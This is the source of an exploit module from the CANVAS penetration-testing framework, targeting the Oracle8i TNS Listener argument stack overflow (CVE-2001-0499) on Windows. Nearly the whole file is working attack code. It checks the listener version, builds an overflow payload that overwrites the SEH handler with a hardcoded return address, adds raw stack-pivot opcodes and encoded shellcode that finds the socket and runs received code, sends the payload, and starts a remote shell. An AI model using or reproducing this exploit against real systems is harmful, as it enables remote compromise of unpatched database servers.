#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("../../libs")
sys.path.append("./libs")

import os
import getopt
import socket
import timeoutsocket
import sys
import struct
import time
import array
import select

# CANVAS modules
from exploitutils import *
from tcpexploit import *
import addencoder
import win32shell
import canvasengine
import shellcodeGenerator

# TNS lib
import tnslib

# GUI info
NAME="Oracle8i TNS Listener stack overflow"
DESCRIPTION="Oracle8i <= 8.1.7 TNS Listener Argument stack overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Oracle"
DOCUMENTATION["Date public"] = "27-06-2001"
DOCUMENTATION["CVE Name"] = "CVE-2001-0499"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0499"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["CERT Advisory"] = "http://www.kb.cert.org/vuls/id/620495"
DOCUMENTATION["References"] = "http://otn.oracle.com/deploy/security/pdf/nai_net8_bof.pdf"
DOCUMENTATION["Repeatability"] = "Single shot"

VERSION="0.3"

GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

NOTES="""
Stack overflow in Oracle8i on handling of long arguments to TNS connect command packages.
We hit the SE handler and direct it into opcode. Using this bug to write a generic TNS lib
we can use for further TNS Listener fuzzing/bugs/exploits.

DEVELOPMENT NOTES:
    
    We're using a Oran8.dll specific FFE3 (jmp ebx) address.
    Well it's not actually a jmp ebx, but another instruction
    that contains FF E3, works for us. 
   
"""

CHANGELOG="""
"""

# GUI run exploit
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

# retadd align, jmp ebx (FF E3), offset to pointer to next SEH before actual SE handler (in dwords)
targets = {
    0 : ["Autoversioning N/A", 0, 0x00000000],
    1 : ["Oracle8i TNS listener", 3, 0x60B237FD, 595]
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.host = "vmware.local"
        self.port = 1521
        self.covertness = 0
        self.ssl = 0
        self.done = 0
        self.badstring = "\x00\\/.:?\r\n%?\" ()" #removed =
        self.version = 1
        self.info, self.align, self.retadd, self.seoffset = targets[self.version]
        
        self.name=NAME        
        return
    
    def createShellcode(self):
        #host=self.callback.ip
        #port=self.callback.port
        sc = shellcodeGenerator.win32()
        """
        we set the GOcode search range to start at 0x180 so we dont
        tread on low range pipes that seem to hate getpeername
        """
        sc.addAttr("GOFindSock", None)
        sc.addAttr("RecvExecWin32", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.raiseError("Problem encoding shellcode")
        self.log("Shellcode len: %d"% len(self.shellcode))
        return self.shellcode
    
    
    def connectToHost(self, t_host, t_port):
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            ret=s.connect((t_host, t_port))
        except socket.error, msg:
            #self.raiseError("Could not connect to Oracle TNS listener at %s:%d"% (self.host, self.port))
            return 0
        except:
            #timed out
            return 0
        if ret==-1:
            #self.raiseError("Could not connect to Oracle TNS listener at %s:%d"% (self.host, self.port))
            return 0
        return s
    
    def test(self):
        #get server version        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        s = self.connectToHost(self.host, self.port)
        if s:
            self.log("Connected to TNS listener at %s:%d"% (self.host, self.port))
        else:
            return 0           

        cdata = "(CONNECT_DATA="
        cdata +=     "(COMMAND=VERSION)"
        cdata += ")"        

        TNS = tnslib.TNS()
        TNS.sendRawCommand(s,cdata)
        rdata = TNS.recvRawData(s)
        s.close()

        if rdata.count("TNSLSNR for 32-bit Windows: Version 8.1.7.0.0"):
                self.log("Vulnerable Oracle8i version detected")
                return 1                    
        return 0
    
    def buildCdata(self, align, retadd, seoffset, size=8000):

        payload = "A" * (size/2)
        payload = stroverwrite(payload, self.shellcode, (size/2) - (len(self.shellcode) + 1024))
        a = 0
        for a in range(0, align):
            payload += "A"
        # idea: addl %reg,%esp jmp %esp + jmp ebx retadd, so when we have a reg we can use
        # to offset %esp into opcode we can get rid off needing an exact SE offset
        for b in range(a, (size/2 - a)/4):
            payload += intel_order(retadd)
            
        # place a jmp over SE handler in SE next record ptr (ebx is pointing here)
        payload = stroverwrite(payload, "\x90\x90\xeb\x04", (seoffset*4) + (align+size/2))
        # actual SE handler hit
        payload = stroverwrite(payload, intel_order(retadd), ((seoffset+1)*4) + (align+size/2))
        # place a post jmp ebx payload after the actual SE handler hit
        POSTJMP = "\x31\xc0"         # xorl %eax,%eax
        POSTJMP +="\x66\xb8\x10\x42" # movw $0x4210,%eax
        POSTJMP +="\x01\xc4"         # addl %eax,%esp
        POSTJMP +="\x90\xff\xe4\x90" # jmp %esp (+ NOP pad, don't ask)
        payload = stroverwrite(payload, POSTJMP, ((seoffset+2)*4) + (align+size/2))

        cdata = "(CONNECT_DATA=" 
        cdata +=     "(COMMAND=STATUS)"
        cdata +=     "(ARGUMENTS=" + payload + ")" 
        cdata += ")"

        return cdata
        

    def run(self):

        self.host=self.target.interface
        print "Attacking: %s"%self.host
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        self.log("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        
        if self.version == 0:
            self.log("Auto versioning not available")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0
        
        self.info, self.align, self.retadd, self.seoffset = targets[self.version]

        cdata = self.buildCdata(self.align, self.retadd, self.seoffset)
        s = self.connectToHost(self.host, self.port)
        if not s:
            self.log("Could not connect to TNS listener")
            return 0
        if s:
            self.log("Connected to TNS listener at %s:%d"% (self.host, self.port))
            TNS = tnslib.TNS()
            TNS.sendRawCommand(s,cdata)
        else:
            self.done = 1  
            
        if self.checkTriggerWin32(s):
            self.log("Setting success flag")
            self.setSucceeded()
            self.done = 1
            import win32MosdefShellServer
            from win32Node import win32Node
            node=win32Node()
            node.parentnode=self.argsDict["passednodes"][0]
            newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
            ret=node

        else:
            s.close()
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
            return ret        
        self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
        return 0
    
    def displayVersions(self):
        i=0
        for listline in targets.values():
            print "\t%d : %s"% (i, listline[0])
            i = i + 1
        sys.exit(0)

    def usage(self):
        print "Options: -t target [ -p port ] -v version"
        self.displayVersions()
        
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0]:
        ret.interact()        
